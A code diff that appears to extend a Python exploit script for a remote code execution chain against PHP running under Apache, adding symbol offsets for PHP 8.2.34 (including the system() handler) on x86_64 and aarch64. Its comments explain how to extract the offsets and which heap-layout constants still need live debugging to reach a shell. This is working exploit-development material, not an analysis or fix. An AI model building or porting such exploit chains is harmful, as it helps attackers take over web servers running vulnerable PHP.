@@ -57,6 +57,32 @@ PROFILES = {
     },
 }
 
+# ---------------------------------------------------------------------------
+# PHP 8.2.34 symbol offsets -- INERT DATA ONLY.
+#
+# Extracted with readelf from the official php:8.2.34-apache image (the last
+# vulnerable 8.2 release; 8.2.35 fixes it).  Two hex constants per arch, per
+# README "Multi-version support" steps 3-5.  Two 8.2-vs-8.4 differences that
+# the README does not call out and that break a naive extraction:
+#   * libphp.so is at /usr/lib/apache2/modules/libphp.so on the Debian-based
+#     8.2 image, NOT /usr/local/lib/apache2/modules/libphp.so as on 8.4.
+#   * zif_system is a LOCAL (not GLOBAL) symbol in the 8.2 build, so
+#     `readelf -Ws ... | grep -w zif_system` alone finds it but filtering on
+#     GLOBAL first would drop it.
+#
+# To point the leak stage (B1) at 8.2, copy dtor_offset/zif_offset into the
+# matching PROFILES arch block above.  THIS IS NOT SUFFICIENT FOR RCE.  The
+# heap-geometry constants -- the hardcoded `S = cand + 0xF8398` in run_chain,
+# delta_min/delta_max, and the OOM trigger sizes in mk_a1.py/cheap_oom_a.py --
+# are specific to the 8.4.26 allocator layout.  Per the README they need live
+# gdb analysis of a running 8.2 worker; they cannot be derived statically, and
+# wrong values crash the worker (segfault) rather than yield a shell.  They are
+# deliberately left at the 8.4 defaults here.
+PHP82_OFFSETS = {
+    "x86_64":  {"dtor_offset": 0x487650, "zif_offset": 0x39b8a0},
+    "aarch64": {"dtor_offset": 0x4606c0, "zif_offset": 0x36ff48},
+}
+
 
 def send_chunked(port: int, path: str, body_file: str, timeout: float,
                  save: str = "") -> bytes:
